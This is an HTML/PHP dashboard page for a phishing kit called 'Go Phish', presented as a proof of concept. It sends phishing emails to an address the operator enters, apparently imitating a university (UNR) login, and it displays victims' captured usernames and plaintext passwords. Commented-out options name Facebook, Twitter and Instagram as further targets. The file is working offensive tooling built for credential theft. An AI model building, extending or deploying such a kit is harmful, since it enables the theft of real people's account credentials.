<html>
	<head>
		<title>Go Phish</title>
		<link rel="stylesheet" href="style.css"/>
	</head>
	<body>
		<div class="container">
			<?php
				if(isset($_GET["error"])) {
					?>
						<h3>Error was caught</h3>
					<?php
				}
			?>
			<div class="content">
				<img class="fisherman" src="fishing.png"/>
				<h1>Go Phish</h1>
				<p class="tagline">A simple, pretty phishing proof of concept.</p>
				<form>
					<input id="email-phish" type="text" name="email" placeholder="name@example.com"/>
					<button id="submit-phish" type="submit"><img src="arrow.png"/></button>
				</form>
			</div>
			<div class="sidebar">
				<div id="phishie-ticker"></div>
				<div id="emails-ticker"></div>
			</div>
		</div>
	</body>
	<script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
	<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script>
		updateTickers();
		
		setInterval(function() {
			updateTickers();
		}, 5000);
		
		function sendMail(type) {
			emailValue = $("#email-phish")[0].value;
			
			showLoading(emailValue, type);
			$.ajax({
				url: "process/send.php?email=" + emailValue + "&type=" + type
			}).done(function(emailId) {
				setTimeout(function() {
					updateTickers();
					if(swal.getState().isOpen == true) {
						swal.close();
					}
					showSent(emailValue, type, emailId);
					//openTestWindow(emailId);
					$("#email-phish")[0].value = "";
				}, 3000);
			});
		}
		
		function openTestWindow(emailId) {
			window.open("test.php?emailId=" + emailId, "_blank", "toolbar=0,location=0,menubar=0,height=730px,width=660px");
		}

		function openPhishWindow(username, password, emailId, timestamp) {
			date = new Date(timestamp * 1000);
			date = date.toLocaleString();
			
			usernameRow = document.createElement("tr");
			usernameKey = document.createElement("td");
			usernameKey.appendChild(document.createTextNode("Username:"));
			usernameValue = document.createElement("td");
			usernameValue.appendChild(document.createTextNode(username));
			usernameRow.appendChild(usernameKey);
			usernameRow.appendChild(usernameValue);
			
			passwordRow = document.createElement("tr");
			passwordKey = document.createElement("td");
			passwordKey.appendChild(document.createTextNode("Password:"));
			passwordValue = document.createElement("td");
			passwordValue.appendChild(document.createTextNode(password));
			passwordRow.appendChild(passwordKey);
			passwordRow.appendChild(passwordValue);
			
			emailIdRow = document.createElement("tr");
			emailIdKey = document.createElement("td");
			emailLink = document.createElement("a");
			emailLink.href="javascript:openTestWindow('" + emailId + "');";
			emailLink.appendChild(document.createTextNode(emailId));
			emailIdKey.appendChild(document.createTextNode("Email ID:"));
			emailIdValue = document.createElement("td");
			emailIdValue.appendChild(emailLink);
			emailIdRow.appendChild(emailIdKey);
			emailIdRow.appendChild(emailIdValue);
			
			timestampRow = document.createElement("tr");
			timestampKey = document.createElement("td");
			timestampKey.appendChild(document.createTextNode("Caught on:"));
			timestampValue = document.createElement("td");
			timestampValue.appendChild(document.createTextNode(date));
			timestampRow.appendChild(timestampKey);
			timestampRow.appendChild(timestampValue);
			
			table = document.createElement("table");
			table.appendChild(usernameRow);
			table.appendChild(passwordRow);
			table.appendChild(emailIdRow);
			table.appendChild(timestampRow);
			
			swal({
				'icon': "warning",
				'title': "Phish Info:",
				'content': table,
			});
		}
		
		function showEmailError(email) {
			if(email == "") {
				swal({
					'title': 'Please enter an email to send a phish.',
		            'icon': "error"
				});
			} else {
				swal({
					'title': 'The email you entered is invalid:',
					'content': makeEmailTag(email),
		            'icon': "error"
				});
			}
		}
		
		function validEmail(email) {
			if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(email)) {
			    return true;
			}
			
			return false;
		}
		
		function makeEmailTag(email) {
			emailTag = document.createElement("p");
			emailTag.classList.add("email");
			emailTag.appendChild(document.createTextNode(email));
			
			return emailTag;
		}
		
		function showLoading(email, type) {
			swal({
				'title': 'Sending phishie to:',
	            'content': makeEmailTag(email),
	            'icon': "warning",
	            'closeOnEsc': false,
	            'closeOnClickOutside': false,
	            'buttons': false
			});
		}
				
		function showSent(email, type, emailId) {
			swal({
	            'title': 'Phishie has been sent to:',
	            'content': makeEmailTag(email),
	            'icon': "success",
	            'buttons': {
					open: {
			            text: "Open",
			            value: "open",
			            closeModal: false
					},
					confirm: {
			            text: "OK",
			            value: true,
			            closeModal: true
					}
		        }
			}).then((value) => {
				if(value == "open") {
					openTestWindow(emailId);
					setTimeout(function() {
						swal.stopLoading();
					}, 3000);
				}
			});
		}
		
		function updateTickers() {
			$.ajax({
				url: "process/phishie-ticker.php"
			}).done(function(value) {
				$("#phishie-ticker")[0].innerHTML = value;
			});
			$.ajax({
				url: "process/emails-ticker.php"
			}).done(function(value) {
				$("#emails-ticker")[0].innerHTML = value;
			});
		}
		
		document.getElementById("submit-phish").addEventListener("click", function(e) {
			e.preventDefault();
			emailValue = $("#email-phish")[0].value;

			if(validEmail(emailValue)) {
				/*swal("What phish would you like to catch?", {
					buttons: {
						cancel: "Cancel",
						fb: {
							text: "Facebook",
							value: "fb"
						},
						tw: {
							text: "Twitter",
							value: "tw"
						},
						ins: {
							text: "Instagram",
							value: "ins"
						},
						unr: {
							text: "UNR",
							value: "unr"
						},
					}
				}).then((value) => {
					sendMail(value);
				});*/
				//do not support types currently, using only UNR
				sendMail("unr");
			} else {
				showEmailError(emailValue);
			}
		});
	</script>
</html>
